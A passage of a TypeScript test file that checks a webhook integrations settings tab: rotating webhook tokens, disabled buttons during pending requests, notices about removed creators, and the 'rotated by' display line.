    await click(q('[data-testid="webhook-rotate-dialog-confirm"]'));
    expect(mockPost).toHaveBeenCalledWith('/servers/srv-1/webhooks/wh-1/rotate');
    expect(q('[data-testid="webhook-reveal"]')!.textContent).toContain('webhooks.reveal.rotatedTitle{"name":"CI"}');
    expect(q('[data-testid="webhook-reveal-url"]')!.textContent).toBe('http://api.test/api/v1/webhooks/wh-1/tok-fresh');
    expect(listCalls()).toBe(2);
  });

  it('its Rotate is disabled while the row has a request in flight', async () => {
    list = [hook('wh-1', { enabled: false, creatorRemovedAt: AT })];
    mockPatch.mockImplementation(() => new Promise(() => {}));
    await render();
    await click(inRow('wh-1', 'webhook-toggle'));
    expect((inRow('wh-1', 'webhook-creator-removed-rotate') as HTMLButtonElement).disabled).toBe(true);
  });

  it('an unparsable date still renders the notice, without the date', async () => {
    list = [hook('wh-1', { enabled: false, creatorRemovedAt: 'garbage' })];
    await render();
    expect(inRow('wh-1', 'webhook-creator-removed-text')!.textContent).toBe('webhooks.creatorRemovedUndated');
  });

  it('no mark, no notice (and none for an older server that sends no such field)', async () => {
    const legacy = { ...hook('wh-2', { enabled: false }) } as Partial<Webhook>;
    delete legacy.adminDisabledAt;
    delete legacy.creatorRemovedAt;
    delete legacy.lastRotatedAt;
    delete legacy.lastRotatedBy;
    list = [hook('wh-1'), legacy as Webhook];
    await render();
    for (const id of ['wh-1', 'wh-2']) {
      expect(inRow(id, 'webhook-creator-removed')).toBeNull();
      expect(inRow(id, 'webhook-admin-disabled')).toBeNull();
      expect(inRow(id, 'webhook-rotated')).toBeNull();
    }
    expect((inRow('wh-2', 'webhook-toggle') as HTMLButtonElement).disabled).toBe(false);
  });
});

describe('IntegrationsTab — the last rotation', () => {
  const twoHoursAgo = () => new Date(Date.now() - 2 * 3_600_000).toISOString();

  it('"rotated <when> by <name>" next to the last use', async () => {
    list = [hook('wh-1', { lastRotatedAt: twoHoursAgo(), lastRotatedBy: { id: 'u-2', username: 'bob', displayName: 'Bob' } })];
    await render();
    const rotated = inRow('wh-1', 'webhook-rotated')!;
    expect(rotated.textContent).toBe('webhooks.rotatedBy{"when":"2 hours ago","name":"Bob"}');
    // after the last-use line, in the same meta line
    expect(inRow('wh-1', 'webhook-last-used')!.parentElement).toBe(rotated.parentElement);
    expect(inRow('wh-1', 'webhook-last-used')!.compareDocumentPosition(rotated) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy();
  });

  it('the rotator\'s account is gone: the time alone', async () => {
    list = [hook('wh-1', { lastRotatedAt: twoHoursAgo(), lastRotatedBy: null })];
    await render();
    expect(inRow('wh-1', 'webhook-rotated')!.textContent).toBe('webhooks.rotated{"when":"2 hours ago"}');
  });

  it('never rotated, or an unparsable date: no line, and the row still renders', async () => {
    list = [hook('wh-1'), hook('wh-2', { lastRotatedAt: 'garbage', lastRotatedBy: { id: 'u-2', username: 'bob', displayName: 'Bob' } })];
    await render();
    expect(inRow('wh-1', 'webhook-rotated')).toBeNull();
    expect(inRow('wh-2', 'webhook-rotated')).toBeNull();
    expect(inRow('wh-2', 'webhook-name')!.textContent).toBe('Deploy bot');
  });
});
